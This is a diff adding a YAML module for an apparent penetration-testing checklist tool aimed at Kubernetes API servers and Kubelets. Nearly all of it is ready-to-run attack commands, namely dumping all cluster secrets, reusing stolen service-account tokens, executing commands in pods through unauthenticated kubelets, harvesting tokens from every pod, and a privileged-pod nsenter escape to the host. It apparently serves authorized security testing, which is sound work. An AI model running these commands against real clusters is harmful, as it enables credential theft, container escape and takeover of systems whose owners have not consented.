@@ -1,0 +1,81 @@
+module: k8s
+name: Kubernetes (6443 API / 10250 Kubelet)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV $IP
+          curl -sk https://$IP:$PORT/version
+
+  - id: api
+    name: API Server (6443)
+    only_ports: [6443, 8443, 443]
+    steps:
+      - id: anon
+        text: Check anonymous / unauth access
+        commands: |
+          curl -sk https://$IP:$PORT/api
+          curl -sk https://$IP:$PORT/apis
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT get --raw /api
+      - id: whoami
+        text: Check what the anonymous/token identity can do
+        commands: |
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT auth can-i --list
+      - id: enum
+        text: Enumerate namespaces / pods / secrets
+        commands: |
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT get namespaces
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT get pods -A
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT get secrets -A -o yaml
+      - id: token
+        text: Use a stolen service-account token
+        manual: true
+        commands: |
+          # token often at /var/run/secrets/kubernetes.io/serviceaccount/token
+          kubectl --insecure-skip-tls-verify -s https://$IP:$PORT --token=<JWT> get pods -A
+      - id: rce_pod
+        text: Escalate — create a privileged pod mounting the host
+        authorized: true
+        manual: true
+        commands: |
+          # kubectl run r --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"r","image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--mount=/proc/1/ns/mnt","--","sh"]}]}}'
+
+  - id: kubelet
+    name: Kubelet (10250)
+    only_ports: [10250, 10255]
+    steps:
+      - id: pods
+        text: List pods via the read-only/authenticated kubelet API
+        commands: |
+          curl -sk https://$IP:$PORT/pods
+          curl -s http://$IP:10255/pods
+      - id: kubeletctl
+        text: Enumerate + exec with kubeletctl
+        commands: |
+          kubeletctl -i --server $IP pods
+          kubeletctl -i --server $IP scan rce
+      - id: exec
+        text: Command execution inside a pod (no auth kubelet)
+        authorized: true
+        commands: |
+          kubeletctl -i --server $IP exec "id" -p <pod> -c <container>
+          curl -sk https://$IP:$PORT/run/<ns>/<pod>/<container> -d "cmd=id"
+      - id: steal_tokens
+        text: Pull service-account tokens from every pod -> pivot to API
+        manual: true
+        commands: |
+          kubeletctl -i --server $IP scan token
+
+  - id: vuln
+    name: Vulnerability Notes
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit kubernetes
